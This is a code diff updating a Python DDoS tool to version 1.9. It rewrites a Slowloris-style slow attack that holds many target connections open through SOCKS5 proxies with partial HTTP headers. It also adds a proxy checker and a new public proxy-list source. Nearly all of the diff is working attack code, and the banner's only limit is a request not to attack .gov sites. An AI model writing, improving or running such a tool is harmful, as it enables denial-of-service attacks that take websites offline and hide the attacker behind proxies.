@@ -17,13 +17,15 @@ print ('''
      CC/////  CC/////   | ddos tool |/ 
       CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
-Python3 version 1.8 (Add Random Head)
+Python3 version 1.9 (Add Socks5 Checker)
                             C0d3d by Lee0n123
 ===============================================
        --> Use 443 Port Auto Enable SSL <--
                     Tos:
           Don't attack .gov website
-         Now here is your "random head"
+           + Changed proxies api
+           + Improved Slow mode
+           + Added Socks5 checker
 ===============================================''')
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
@@ -266,32 +268,95 @@ def post():
 			except:
 				print ("[!] Connection Error")
 				s.close()
-
-def slow():
-	time.sleep(1)# SLow Mode
-	proxy = random.choice(proxies).strip().split(":")
+socket_list=[]
+def slow(conn):
+	for _ in range(conn):
+		proxy = random.choice(proxies).strip().split(":")
+		try:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			s = socks.socksocket()
+			s.settimeout(1)
+			s.connect((str(ip), int(port)))
+			if str(port) == '443':
+				s = ssl.wrap_socket(s)
+			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
+			s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
+			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+			s.send(("Connection:keep-alive").encode("utf-8"))
+			socket_list.append(s)
+			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+			sys.stdout.flush()
+		except:
+			s.close()
+			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+			sys.stdout.flush()
+	for s in list(socket_list):
+			s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
+			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+			sys.stdout.flush()
+	for _ in range(conn - len(socket_list)):
+		proxy = random.choice(proxies).strip().split(":")
+		try:
+			socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
+			s = socks.socksocket()
+			s.settimeout(1)
+			s.connect((str(ip), int(port)))
+			if str(port) == '443':
+				s = ssl.wrap_socket(s)
+			s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
+			s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
+			s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+			s.send(("Connection:keep-alive").encode("utf-8"))
+			socket_list.append(s)
+			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+			sys.stdout.flush()
+		except:
+			sys.stdout.write("[*] Running Slow Attack || Connections: "+str(len(socket_list))+"\r")
+			sys.stdout.flush()
+			pass
+def checking(lines):
+	global nums
+	global proxies
+	proxy = lines.strip().split(":")
 	try:
 		socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
 		s = socks.socksocket()
+		s.settimeout(0.5)#500ms
 		s.connect((str(ip), int(port)))
-		if str(port) == '443':
+		if port == 443:
 			s = ssl.wrap_socket(s)
-		else:
-			pass
-		s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))# Slowloris format header
-		s.send("User-Agent: {}\r\n".format(random.choice(useragents)).encode("utf-8"))
-		s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
-		s.send(("Connection:keep-alive").encode("utf-8"))
-		print("[*] Slow attack from --> "+str(proxy[0])+":"+str(proxy[1]))
-		while True:
-			time.sleep(14)
-			s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
-			print("[*] Resent from --> "+str(proxy[0])+":"+str(proxy[1]))
-	except:
+		s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
 		s.close()
-		print("[!] Socks Down")
-		slow()
+	except:
+		proxies.remove(lines)
+	nums = nums + 1
 
+def check_socks():
+	global proxies
+	global nums
+	nums = 0
+	thread_list=[]
+	for lines in list(proxies):
+		th = threading.Thread(target=checking,args=(lines,))
+		th.start()
+		thread_list.append(th)
+		time.sleep(0.1)
+		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.flush()
+	for th in list(thread_list):
+		th.join()
+		sys.stdout.write("> Checked "+str(nums)+" proxies\r")
+		sys.stdout.flush()
+	print("\r\n> Checked all proxies, Total Worked:"+str(len(proxies)))
+	ans = input("> Do u want to save them in a file? (y/n)")
+	if ans == "y":
+		in_file = str(input("> Input your filename(socks.txt):"))
+		if in_file == "":
+			in_file = "socks.txt"
+		with open(in_file, 'wb') as fp:
+			for lines in list(proxies):
+				fp.write(bytes(lines,encoding='utf8'))
+		fp.close()
 def main():
 	global ip
 	global url2
@@ -315,7 +380,7 @@ def main():
 	thread_num = int(input("> Threads:"))
 	N = str(input("> Do you need to get socks5 list?(y/n):"))
 	if N == 'y':
-		r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5")
+		r = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&country=all")
 		with open("socks.txt",'wb') as f:
 			f.write(r.content)
 			print("\r\n [!] Have already download socks5 list as socks.txt\r\n")
@@ -326,26 +391,20 @@ def main():
 		out_file = str("socks.txt")
 	else:
 		out_file = str(out_file)
-	print ("> Number Of Proxies: %s" %(len(open(out_file).readlines())))
 	proxies = open(out_file).readlines()
+	print ("> Number Of Proxies: %s" %(len(proxies)))
 	time.sleep(0.03)
+	ans = str(input("> Do u need to check socks list?(y/n)"))
+	if ans == "y":
+		check_socks()
 	if mode == "slow":
-		for i in range(thread_num):
-			th = threading.Thread(target = slow)
-			th.start()
-			time.sleep(0.08)
+		slow(thread_num)
+	multiple = int(input("> Input the Magnification:"))
+	if url == '':
+		url2 = "/"
 	else:
-		multiple = int(input("> Input the Magnification:"))
-		if url == '':
-			url2 = "/"
-		else:
-			url2 = str(url)
-	if mode == "slow":
-		for i in range(thread_num):
-			th = threading.Thread(target = slow)
-			th.start()
-			time.sleep(0.08)
-	elif mode == "post":
+		url2 = str(url)
+	if mode == "post":
 		for i in range(thread_num):
 			th = threading.Thread(target = post)
 			th.start()
